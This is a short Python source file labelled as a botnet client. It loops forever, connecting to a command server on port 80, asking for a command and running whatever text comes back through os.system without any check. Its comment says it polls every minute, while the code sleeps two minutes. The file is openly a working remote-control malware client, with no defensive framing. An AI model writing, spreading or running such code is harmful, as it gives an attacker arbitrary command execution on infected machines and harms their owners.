# dz-botnet client.py
# Basic client program.


import os
import socket
import time


SERVER_ADDR = ''
SERVER_PORT = 80

def main():
    # Every minute, poll the server for new commands.
    while True:

        # Initialize the socket.
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((SERVER_ADDR, SERVER_PORT)) 
        
        try:
            # Print a message.
            print("Connecting to the server...")

            # Send a request to the server.
            request = "REQUEST_COMMAND"
            c.sendall(request.encode("UTF-8"))

            # Receive the server response and execute it.
            response = ""
            data = c.recv(1024)
            response = response + data.decode()

            print("Executing command.\n")
            os.system(response)

        finally:
            # Close the connection.
            c.close()
        
            # Wait for a minute.
            time.sleep(120)

if __name__== "__main__":
      main()

